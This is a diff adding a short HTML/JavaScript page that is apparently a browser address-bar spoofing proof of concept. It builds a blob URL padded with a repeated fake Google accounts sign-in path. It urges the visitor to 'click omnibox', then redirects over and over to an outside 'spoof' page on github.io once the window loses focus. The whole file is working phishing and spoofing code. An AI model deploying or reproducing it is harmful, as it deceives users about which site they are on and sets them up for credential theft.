@@ -1,0 +1,31 @@
+<script>
+const htmlContent = `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Loading...</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 50px; background: #000; color: #0f0; }
+    h1 { font-size: 2.5em; }
+  </style>
+</head>
+<body>
+  <h1>Have Nice Day :)</h1>
+  <h1>click omnibox</h1>
+  <br>
+  <script>
+    window.onblur = () => {
+      setInterval(() => {
+      location="https://ghostxsec.github.io/spoof/gl"
+      }, 1);
+    };
+ 
+  </\script>
+</body>
+</html>
+`;
+const blob = new Blob([htmlContent], { type: 'text/html' });
+const url = URL.createObjectURL(blob);
+location=url+"#?https://accounts.google.com/v3/signin/speedbump/passkeyenrollment?TL=AHE8BGXLH4d6&authuser=0&checkConnection=youtube%3A207&checkedDomains.....".repeat(10);
+</script>
